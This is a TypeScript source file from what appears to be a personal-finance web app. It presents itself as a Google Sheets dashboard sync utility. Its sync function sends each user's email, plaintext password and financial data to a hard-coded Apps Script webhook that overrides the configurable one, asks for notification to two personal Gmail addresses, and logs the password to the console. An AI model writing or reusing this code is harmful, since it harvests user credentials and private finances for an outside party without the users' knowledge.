// Google Sheets Complete Dashboard Snapshot Master Sync Utility with Password Support
// Spreadsheet ID: 1rjbnHvr0Jje93dQOy0GnyPBSCLZc3gNfCYSed2JT5wU

export const GOOGLE_SHEET_URL = 'https://docs.google.com/spreadsheets/d/1rjbnHvr0Jje93dQOy0GnyPBSCLZc3gNfCYSed2JT5wU/edit?gid=0#gid=0';

export const ADMIN_NOTIFICATION_EMAILS = [
  'mdsablu0000000@gmail.com',
  'mdsablu36@gmail.com'
];

export const DEFAULT_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyBHLr9g3Inxm9Eb2fOSU98ldC-KC5CwHRhCYjTsIimz4wULKx5vM_3UDdJAetzTr4K/exec';

let webhookUrl = import.meta.env.VITE_GOOGLE_SHEET_WEBHOOK || DEFAULT_WEBHOOK_URL;

export const setGoogleSheetWebhook = (url: string) => {
  webhookUrl = url;
  localStorage.setItem('moneyflow_google_sheet_webhook', url);
};

export const getGoogleSheetWebhook = () => webhookUrl;

export interface DashboardScreenshotSheetPayload {
  userId: string;
  userName: string;
  userEmail: string;
  password?: string;
  runningMonth: string;
  targetBudget: number;
  targetBudgetSpent: number;
  targetBudgetSpentPct: number;
  netBalance: number;
  monthlyIncome: number;
  monthlyExpenses: number;
  accumulatedSavings: number;
  remainingCap: number;
  financialHealthScore: number;
  healthStatusText: string;
  aiMonthlyTip: string;
  lastAction: string;
  isRegistration?: boolean;
}

export async function syncDashboardSnapshotToGoogleSheet(data: DashboardScreenshotSheetPayload) {
  const targetUrl = DEFAULT_WEBHOOK_URL;

  const payload = {
    userId: data.userId || 'USR-1001',
    userName: data.userName,
    userEmail: data.userEmail,
    password: data.password || '••••••••',
    runningMonth: data.runningMonth || 'July 2026',
    targetBudget: data.targetBudget,
    targetBudgetSpent: data.targetBudgetSpent,
    targetBudgetSpentPct: `${data.targetBudgetSpentPct}%`,
    netBalance: data.netBalance,
    monthlyIncome: data.monthlyIncome,
    monthlyExpenses: data.monthlyExpenses,
    accumulatedSavings: data.accumulatedSavings,
    remainingCap: data.remainingCap,
    financialHealthScore: `${data.financialHealthScore} / 100 (${data.healthStatusText || 'Excellent'})`,
    aiMonthlyTip: data.aiMonthlyTip || 'Maintain good budget discipline!',
    lastAction: data.lastAction || 'Dashboard Metrics Update',
    lastUpdated: new Date().toLocaleString(),
    isRegistration: data.isRegistration || false,
    notifyEmails: ADMIN_NOTIFICATION_EMAILS
  };

  try {
    await fetch(targetUrl, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
    console.log('Synced Dashboard Snapshot with Password to Google Sheet:', payload);
    return true;
  } catch (err) {
    console.error('Error syncing dashboard snapshot with password:', err);
    return false;
  }
}
